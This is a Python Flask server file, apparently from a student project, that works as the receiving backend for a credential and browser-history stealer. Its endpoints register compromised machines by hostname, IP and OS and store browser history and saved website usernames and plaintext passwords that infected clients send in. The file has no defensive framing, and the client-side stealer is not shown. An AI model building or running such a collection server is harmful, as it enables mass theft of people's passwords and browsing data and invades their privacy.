from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///pbl202-24.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Models
class Machine(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(200), unique=True, nullable=False)
    hostname = db.Column(db.String(200))
    ip_address = db.Column(db.String(100))
    os_info = db.Column(db.String(200))
    registered_at = db.Column(db.DateTime, default=datetime.utcnow)

class BrowserHistory(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(200), db.ForeignKey('machine.machine_id'))
    url = db.Column(db.Text)
    title = db.Column(db.Text)
    visit_time = db.Column(db.String(100))
    browser_type = db.Column(db.String(50))

class Credential(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(200), db.ForeignKey('machine.machine_id'))
    website = db.Column(db.String(200))
    username = db.Column(db.String(200))
    password = db.Column(db.String(500))
    browser_type = db.Column(db.String(50))

# Routes
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    if not data or 'machine_id' not in data:
        return jsonify({'error': 'Missing machine_id'}), 400

    existing = Machine.query.filter_by(machine_id=data['machine_id']).first()
    if existing:
        return jsonify({'message': 'Already registered'}), 200

    new_machine = Machine(
        machine_id=data['machine_id'],
        hostname=data.get('hostname', ''),
        ip_address=data.get('ip_address', ''),
        os_info=data.get('os_info', '')
    )
    db.session.add(new_machine)
    db.session.commit()
    return jsonify({'message': 'Machine registered'}), 200

@app.route('/submit/history', methods=['POST'])
def submit_history():
    data = request.json
    history_list = data.get('history', [])
    machine_id = data.get('machine_id')

    for entry in history_list:
        history = BrowserHistory(
            machine_id=machine_id,
            url=entry['url'],
            title=entry.get('title', ''),
            visit_time=entry.get('visit_time', ''),
            browser_type=entry.get('browser_type', '')
        )
        db.session.add(history)

    db.session.commit()
    return jsonify({'message': 'History submitted'}), 200

@app.route('/submit/credentials', methods=['POST'])
def submit_credentials():
    data = request.json
    cred_list = data.get('credentials', [])
    machine_id = data.get('machine_id')

    for entry in cred_list:
        cred = Credential(
            machine_id=machine_id,
            website=entry['website'],
            username=entry['username'],
            password=entry['password'],
            browser_type=entry.get('browser_type', '')
        )
        db.session.add(cred)

    db.session.commit()
    return jsonify({'message': 'Credentials submitted'}), 200

# Initialize DB
@app.before_first_request
def create_tables():
    db.create_all()

if __name__ == '__main__':
    if not os.path.exists('pbl202-24.db'):
        with app.app_context():
            db.create_all()
    app.run(debug=True)

